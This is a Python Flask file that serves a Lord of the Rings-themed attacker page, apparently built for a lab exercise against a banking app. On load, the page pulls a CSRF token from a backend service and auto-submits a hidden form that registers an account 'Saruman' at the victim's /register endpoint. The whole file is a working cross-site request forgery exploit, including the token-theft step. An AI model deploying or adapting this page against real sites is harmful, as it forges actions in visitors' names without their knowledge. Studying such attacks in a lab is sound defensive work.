from flask import *
#from myCode.customException import *
import json
import sys
import requests
import jwt

app = Flask('Mordor incorporated')

FRONT_END_IP = 'userservice'
FRONT_END_PORT = '5556'

BACK_END_IP = 'dbservice'
BACK_END_PORT = '5555'

TARGET_URL = "http://userservice:5556/register"
IMAGE_URL = "https://static.wikia.nocookie.net/lotr/images/8/8b/DOiAi2WUEAE3A1Y.0.jpg/revision/latest?cb=20200305221819"
 
def html(message):

    csrfToken = "help"
    data = {'ip' : request.remote_addr}
    response = requests.get('http://' + BACK_END_IP + ':' + BACK_END_PORT + '/getcsrf', json=data)
    decodedCsrfToken = json.loads(response.content.decode('utf-8'))
    print("ici" , flush=True)
    print(decodedCsrfToken, flush=True)

    if decodedCsrfToken['message'] != None:
        csrfToken = str(decodedCsrfToken['message'][0])


    #If no token is found
    return f""" 
        
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Banking App</title>
            <style>
                body {{
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                margin: 0;
                background-color: #f4f4f4;
                font-family: Arial, sans-serif;
            }}

            form {{
                background-color: #ffffff;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                max-width: 400px;
                width: 100%;
                position: relative;
                margin-bottom: 20px;
            }}

            .message-box {{
                background-color: #d4edda;
                color: #155724;
                padding: 10px 10px;
                border-radius: 4px;
                margin-bottom: 16px;
                margin: 10px 10px;
            }}

            label {{
                display: block;
                margin-bottom: 8px;
            }}

            input {{
                width: 100%;
                padding: 8px;
                margin-bottom: 16px;
                box-sizing: border-box;
            }}

            button {{
                width: 100%;
                background-color: #007BFF;
                color: #fff;
                padding: 10px 15px;
                border: none;
                border-radius: 4px;
                cursor: pointer;
                font-size: 16px;
                margin-bottom: 16px; /* Add margin between the form and the search field */
            }}
            
            .search-container {{
                display: flex;
                flex-direction: column;
                align-items: center;
            }}

            input.search {{
                width: 100%;
                padding: 8px;
                margin-bottom: 8px;
                box-sizing: border-box;
            }}

            button.search-button, button.fetch-button {{
                width: 100%;
                background-color: #007BFF;
                color: #fff;
                padding: 8px;
                border: none;
                border-radius: 4px;
                cursor: pointer;
                font-size: 14px;
            }}
            </style>
        </head>

        <body>
            <h1> Welcome to Mordor where we have the best rings in middle-earth</h1>
            <div class="message-box"> {message} </div>

            <form action="{TARGET_URL}" method="POST" class="attack" id="csrf">
                <input type="hidden" name="name" value="Saruman">
                <input type="hidden" name="email" value="mordor4ever@gmail.com">
                <input type="hidden" name="password" value="uruk">
                <input type="hidden" name="csrfToken" value={csrfToken}>
            </form>

            <img src ="{IMAGE_URL}" alt="TheOneRing">
            <form action="">
                <button type="submit">The nine rings of men</button>
            </form>
        </body>
        </html>

        {script_code}
           
        """
@app.route('/')
def welcome():
    print("Boromir has died", flush=True)
    return html("Welcome Boromir, we've been expecting you")

script_code = '''
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            var form = document.getElementById('csrf');
            form.submit();
        });
    </script>
'''

if __name__ == '__main__':
	app.run(debug=True, host='0.0.0.0', port=5554)
